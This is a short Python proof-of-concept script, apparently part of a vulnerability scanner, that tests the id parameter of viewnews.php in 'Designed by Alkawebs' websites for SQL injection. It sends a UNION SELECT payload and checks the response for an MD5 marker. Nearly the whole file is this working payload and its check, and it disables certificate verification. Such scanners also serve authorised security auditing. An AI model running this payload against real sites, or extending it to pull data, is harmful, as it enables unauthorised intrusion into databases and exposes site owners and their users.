#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Designed by Alkawebs SQL Injection
referer: unknow
author: Lucifer
description: viewnews.php文件id参数存在注入。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class alkawebs_viewnews_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/viewnews.php?id=-2%20UnIoN%20SeLeCt%201%2CMd5%281234%29%2C3%2C4%2C5%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                printGreen("[+]Success:存在Designed by Alkawebs SQL Injection 漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在alkawebs_viewnews_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = alkawebs_viewnews_sqli(sys.argv[1])
    testVuln.run()